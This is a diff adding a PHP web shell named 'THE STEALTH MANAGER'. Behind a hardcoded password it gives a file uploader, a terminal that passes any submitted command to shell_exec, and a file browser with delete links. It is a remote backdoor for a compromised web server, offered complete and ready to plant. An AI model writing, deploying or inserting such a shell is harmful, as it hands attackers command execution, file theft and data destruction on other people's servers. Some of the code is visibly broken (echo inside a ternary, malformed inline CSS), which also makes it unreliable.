@@ -1,0 +1,62 @@
+<?php
+/**
+ * THE STEALTH MANAGER v1.0
+ * Format: .phtml (PHP + HTML)
+ */
+
+// Ganti password ini!
+$auth_pass = "bossqu123"; 
+
+session_start();
+if (isset($_GET['logout'])) unset($_SESSION['logged']);
+if (isset($_POST['pass']) && $_POST['pass'] == $auth_pass) $_SESSION['logged'] = true;
+
+if (!isset($_SESSION['logged'])) {
+    die('<form method="post" style="text-align:center;margin-top:20% text-family:sans-serif;">
+         <input type="password" name="pass" placeholder="???" autofocus>
+         </form>');
+}
+
+$path = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
+chdir($path);
+
+echo "<html><body style='background:#111;color:#0f0;font-family:monospace;'>";
+echo "<h3>SYSTEM: " . php_uname() . "</h3>";
+echo "<b>PATH:</b> " . $path . "<br><hr>";
+
+// --- UPLOADER ---
+echo '<form enctype="multipart/form-data" method="POST">
+      [+] Upload: <input type="file" name="f"> <input type="submit" value="Go">
+      </form>';
+if(isset($_FILES['f'])) {
+    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']) ? 
+    echo "OK!" : echo "FAIL!";
+}
+
+// --- TERMINAL ---
+echo '<form method="POST">
+      [#] CMD: <input type="text" name="c" style="width:70%;background:#222;color:#0f0;border:1px solid #0f0;">
+      </form>';
+if(isset($_POST['c'])) {
+    echo "<pre style='background:#000;padding:10px;border:1px dashed #0f0;'>" . shell_exec($_POST['c'] . " 2>&1") . "</pre>";
+}
+
+// --- FILE MANAGER ---
+echo "<table border='1' width='100%' style='border-collapse:collapse;'>
+      <tr style='background:#333;'><th>Name</th><th>Size</th><th>Action</th></tr>";
+foreach (scandir($path) as $v) {
+    if($v == ".") continue;
+    $s = is_dir($v) ? "DIR" : (round(filesize($v)/1024, 2) . " KB");
+    echo "<tr>
+            <td><a href='?d=$path/$v' style='color:#0f0;'>$v</a></td>
+            <td>$s</td>
+            <td><a href='?d=$path&del=$v' style='color:red;'>[X]</a></td>
+          </tr>";
+}
+echo "</table>";
+
+if(isset($_GET['del'])) {
+    unlink($_GET['del']) || rmdir($_GET['del']);
+    echo "<script>window.location='?d=$path';</script>";
+}
+echo "</body></html>";
